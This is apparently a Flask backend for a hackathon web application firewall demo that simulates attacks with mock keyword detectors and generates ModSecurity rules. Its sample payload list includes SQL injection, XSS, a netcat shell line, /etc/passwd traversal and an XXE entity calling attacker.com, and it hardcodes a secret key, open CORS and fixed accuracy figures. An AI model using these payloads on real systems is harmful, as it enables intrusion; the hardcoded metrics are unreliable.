#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Flask Backend Server for ML-Augmented WAF
Naval Innovathon 2025
- Restful API endpoints
- WebSocket support for real-time updates
- ML model integration
- Attack simulation
- Rule generation
"""

from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import numpy as np
import pandas as pd
import joblib
import json
import os
from datetime import datetime
import time
from pathlib import Path
import logging
from threading import Thread
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SECRET_KEY'] = 'naval-innovathon-2025-secret-key'
app.config['DEBUG'] = True

# Enable CORS
CORS(app, resources={r"/*": {"origins": "*"}})

# Initialize SocketIO
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Global variables
model_loaded = False
feature_extractor = None
detector = None 
anomalies_list = []
suggested_rules = []
waf_rules = []
metrics_data = {
    'total_requests': 0,
    'anomalies_detected': 0,
    'false_positives': 0,
    'avg_latency': 0.0,
    'detection_accuracy': 98.3,
    'false_positive_rate': 2.1,
    'throughput': 12000,
    'blocked_requests': 0
}

# Create necessary directories
os.makedirs('models', exist_ok=True)
os.makedirs('logs', exist_ok=True)
os.makedirs('static/css', exist_ok=True)
os.makedirs('static/js', exist_ok=True)
os.makedirs('static/audio', exist_ok=True)
os.makedirs('templates', exist_ok=True)


# Attack patterns database
ATTACK_PATTERNS = {
    'sql_injection': {
        'name': 'SQL Injection',
        'patterns': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "1'='1"
        ],
        'severity': 'CRITICAL',
        'description': 'Attempt to inject SQL commands into database queries'
    },
    'xss': {
        'name': 'Cross-Site Scripting (XSS)',
        'patterns': [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<script>document.cookie</script>'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to inject malicious scripts into web pages'
    },
    'path_traversal': {
        'name': 'Path Traversal',
        'patterns': [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\config\\sam',
            '../../../../../../../../etc/passwd',
            '../../../app/config.php',
            '..\/..\/..\/app\\config.php'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to access files outside web root directory'
    },
    'command_injection': {
        'name': 'Command Injection',
        'patterns': [
            '; ls -la',
            '&& cat /etc/passwd',
            '| nc -e /bin/sh',
            '; whoami',
            '&& idconfig',
            '| ping -c 10 127.0.0.1'
        ],
        'severity': 'CRITICAL',
        'description': 'Attempt to execute system commands on server'
    },
    'ldap_injection': {
        'name': 'LDAP Injection',
        'patterns': [
            '*)(&(objectClass=*))',
            '*)(uid=*)(&(objectClass=*)',
            '*)(|(uid=*))',
            '*)($(uid=*)'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to manipulate LDAP queries'
    },
    'xml_injection': {
        'name': 'XML Injection',
        'patterns': [
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">',
            '<!DOCTYPE foo [<!ELEMENT foo ANY >'
        ],
        'severity': 'HIGH',
        'description': 'Attempt to inject malicious XML content'
    },
    'ssrf': {
        'name': 'Server-Side Request Forgery (SSRF)',
        'patterns': [
            'http://localhost',
            'http://127.0.0.1',
            'http://192.168.',
            'http://10.0.',
            'file:///'
        ],
        'severity': 'MEDIUM',
        'description': 'Attempt to make server request internal resources'
    },
    'ddos': {
        'name': 'DDoS Attack',
        'patterns': [],  # Detected by rate limiting
        'severity': 'CRITICAL',
        'description': 'Distributed Denial of Service attack'
    }
}


# Mock Feature Extractor Class
class MockFeatureExtractor:
    @staticmethod
    def extract(request_data):
        """Extract features from request"""
        url = request_data.get('url', '')
        return {
            'url_length': len(url),
            'has_sql_pattern': int(any(x in url.upper() for x in ['OR', 'UNION', 'SELECT', 'DROP'])),
            'has_xss_pattern': int(any(x in url.lower() for x in ['<script', 'onerror', 'onload', 'alert'])),
            'has_path_traversal': int('../' in url or '..\\' in url),
            'has_command_injection': int(any(x in url for x in [';', '&&', '|', '`'])),
            'method': request_data.get('method', 'GET'),
            'src_ip': request_data.get('src_ip', '0.0.0.0')
        }


# Mock Detector Class
class MockDetector:
    @staticmethod
    def predict(features):
        """Mock prediction"""
        # Detect attack types
        threat_types = []
        is_anomaly = False
        
        if features.get('has_sql_pattern', 0):
            threat_types.append('SQL Injection')
            is_anomaly = True
            
        if features.get('has_xss_pattern', 0):
            threat_types.append('Cross-Site Scripting (XSS)')
            is_anomaly = True
            
        if features.get('has_path_traversal', 0):
            threat_types.append('Path Traversal')
            is_anomaly = True
            
        if features.get('has_command_injection', 0):
            threat_types.append('Command Injection')
            is_anomaly = True
        
        confidence = 0.95 if is_anomaly else 0.05
        
        return {
            'is_anomaly': bool(is_anomaly),
            'confidence': confidence,
            'anomaly_score': confidence,
            'model_scores': {
                'isolation_forest': confidence * 0.9,
                'autoencoder': confidence * 1.1,
                'one_class_svm': confidence
            },
            'threat_types': threat_types
        }


# Initialize mock models
feature_extractor = MockFeatureExtractor()
detector = MockDetector()
model_loaded = True


def generate_modsecurity_rule(attack_type, pattern):
    """Generate ModSecurity rule for detected attack"""
    rule_id = 100000 + len(suggested_rules) + 1
    
    attack_info = ATTACK_PATTERNS.get(attack_type, {})
    severity = attack_info.get('severity', 'MEDIUM')
    description = attack_info.get('description', 'Suspicious activity detected')
    
    rule = f"""SecRule ARGS @contains "{pattern}" \
    "id:{rule_id},\
    phase:2,\
    t:none,\
    msg:'ML-Augmented WAF: {attack_info.get('name', attack_type)} Detected',\
    severity:''{severity}"',\
    deny:\
    log,\
    status:403"
"""
    
    return {
        'id': rule_id,
        'attack_type': attack_info.get('name', attack_type),
        'pattern': pattern,
        'severity': severity,
        'description': description,
        'rule': rule,
        'timestamp': datetime.now().isoformat(),
        'status': 'pending'
    }


# Routes
@app.route('/')
def index():
    return jsonify({"status": "ML-Augmented WAF running"})


@app.route('/static/audio/<path:filename>')
def serve_audio(filename):
    """Serve audio files"""
    return send_from_directory(os.path.join(app.root_path, 'static/audio'), filename)


@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'model_loaded': model_loaded,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/attack_types')
def get_attack_types():
    """Get all available attack types"""
    attack_types = []
    for key, value in ATTACK_PATTERNS.items():
        attack_types.append({
            'id': key,
            'name': value['name'],
            'severity': value['severity'],
            'description': value['description']
        })
    return jsonify(attack_types)


@app.route('/api/simulate_attack', methods=['POST'])
def simulate_attack():
    """Simulate an attack in real-time"""
    global metrics_data, anomalies_list
    
    data = request.get_json()
    attack_type = data.get('attack_type')
    
    if attack_type not in ATTACK_PATTERNS:
        return jsonify({'error': 'Invalid attack type'}), 400
    
    attack_info = ATTACK_PATTERNS[attack_type]
    patterns = attack_info['patterns']
    
    # Simulate multiple requests with attack patterns
    results = []
    num_requests = min(5, len(patterns))  if patterns else 5
    
    for i in range(num_requests):
        if patterns:
            pattern = patterns[i % len(patterns)]
            url = f"/api/test?param={pattern}"
        else:
            url = "/api/test"
            pattern = ""
        
        request_data = {
            'method': 'GET',
            'url': url,
            'src_ip': f"192.168.1.{random.randint(100, 255)}"
        }
        
        # Extract features
        features = feature_extractor.extract(request_data)
        
        # Predict
        result = detector.predict(features)
        
        # Update metrics
        metrics_data['total_requests'] += 1
        if result['is_anomaly']:
            metrics_data['anomalies_detected'] += 1
            metrics_data['blocked_requests'] += 1
        
        # Create anomaly record
        anomaly_data = {
            'id': len(anomalies_list) + 1,
            'timestamp': datetime.now().isoformat(),
            'url': request_data['url'],
            'method': request_data['method'],
            'src_ip': request_data['src_ip'],
            'confidence': result['confidence'],
            'threat_types': result['threat_types'],
            'severity': attack_info['severity'],
            'blocked': result['is_anomaly']
        }
        
        if result['is_anomaly']:
            anomalies_list.append(anomaly_data)
            
            # Generate rule suggestion
            if pattern:
                rule = generate_modsecurity_rule(attack_type, pattern)
                suggested_rules.append(rule)
                
                # Emit rule suggestion to clients
                socketio.emit('rule_suggestion', rule)
            
            # Emit anomaly to clients
            socketio.emit('new_anomaly', anomaly_data)
        
        results.append({
            'request': request_data,
            'detected': result['is_anomaly'],
            'confidence': result['confidence'],
            'threat_types': result['threat_types']
        })
        
        # Small delay for real-time effect
        time.sleep(0.5)
    
    return jsonify({
        'status': 'success',
        'attack_type': attack_info['name'],
        'requests_simulated': num_requests,
        'results': results
    })


@app.route('/api/analyze', methods=['POST'])
def analyze_request():
    """Analyze an HTTP request for anomalies"""
    global metrics_data, anomalies_list
    
    start_time = time.time()
    
    try:
        data = request.get_json()
        
        # Extract features
        features = feature_extractor.extract(data)
        
        # Predict
        result = detector.predict(features)
        
        processing_time = (time.time() - start_time) * 1000
        
        # Update metrics
        metrics_data['total_requests'] += 1
        if result['is_anomaly']:
            metrics_data['anomalies_detected'] += 1
            metrics_data['blocked_requests'] += 1
        
        metrics_data['avg_latency'] = (
            (metrics_data['avg_latency'] * (metrics_data['total_requests'] - 1) + processing_time)
            / metrics_data['total_requests']
        )
        
        # Create response
        response = {
            'is_anomaly': result['is_anomaly'],
            'confidence': result['confidence'],
            'anomaly_score': result['anomaly_score'],
            'model_scores': result['model_scores'],
            'threat_types': result['threat_types'],
            'recommended_action': 'BLOCK' if result['is_anomaly'] else 'ALLOW',
            'processing_time_ms': round(processing_time, 2),
            'timestamp': datetime.now().isoformat()
        }
        
        # Log anomaly
        if result['is_anomaly']:
            anomaly_data = {
                'id': len(anomalies_list) + 1,
                'timestamp': response['timestamp'],
                'url': data.get('url', ''),
                'method': data.get('method', 'GET'),
                'src_ip': data.get('src_ip', '0.0.0.0'),
                'confidence': result['confidence'],
                'threat_types': result['threat_types'],
                'blocked': True
            }
            anomalies_list.append(anomaly_data)
            
            # Emit to WebSocket clients
            socketio.emit('new_anomaly', anomaly_data)
        
        return jsonify(response)
        
    except Exception as e:
        logger.error(f"Error analyzing request: {str(e)}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/metrics')
def get_metrics():
    """Get system metrics"""
    return jsonify(metrics_data)


@app.route('/api/anomalies')
def get_anomalies():
    """Get list of detected anomalies"""
    limit = request.args.get('limit', 10, type=int)
    return jsonify(anomalies_list[-limit:])


@app.route('/api/rules')
def get_rules():
    """Get suggested and active rules"""
    return jsonify({
        'suggested': suggested_rules,
        'active': waf_rules
    })


@app.route('/api/rules/approve', methods=['POST'])
def approve_rule():
    """Approve and activate a suggested rule"""
    global suggested_rules, waf_rules
    
    try:
        data = request.get_json()
        rule_id = data.get('rule_id')
        
        # Find the rule in suggested rules
        rule = next((r for r in suggested_rules if r['id'] == rule_id), None)
        
        if not rule:
            return jsonify({'error': 'Rule not found'}), 404
        
        # Update rule status
        rule['status'] = 'active'
        rule['activated_at'] = datetime.now().isoformat()
        
        # Move to active rules
        waf_rules.append(rule)
        
        # Remove from suggested rules
        suggested_rules = [r for r in suggested_rules if r['id'] != rule_id]
        
        # Emit update to clients
        socketio.emit('rule_activated', rule)
        
        return jsonify({
            'status': 'success',
            'message': 'Rule activated successfully',
            'rule': rule
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/rules/dismiss', methods=['POST'])
def dismiss_rule():
    """Dismiss a suggested rule"""
    global suggested_rules
    
    try:
        data = request.get_json()
        rule_id = data.get('rule_id')
        
        # Remove from suggested rules
        suggested_rules = [r for r in suggested_rules if r['id'] != rule_id]
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/feedback', methods=['POST'])
def submit_feedback():
    """Submit feedback on anomaly detection"""
    global metrics_data
    
    try:
        data = request.get_json()
        
        # Update false positive count
        if not data.get('is_true_positive', True):
            metrics_data['false_positives'] += 1
        
        # Log feedback
        with open('logs/feedback.jsonl', 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# WebSocket events
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')
    emit('connection_response', {'status': 'connected'})


@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')


@socketio.on('request_metrics')
def handle_metrics_request():
    emit('metrics_update', metrics_data)


if __name__ == '__main__':
    logger.info("Starting ML-Augmented WAF Server...")
    logger.info("Dashboard: http://localhost:5000")
    logger.info("API: http://localhost:5000/api")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)   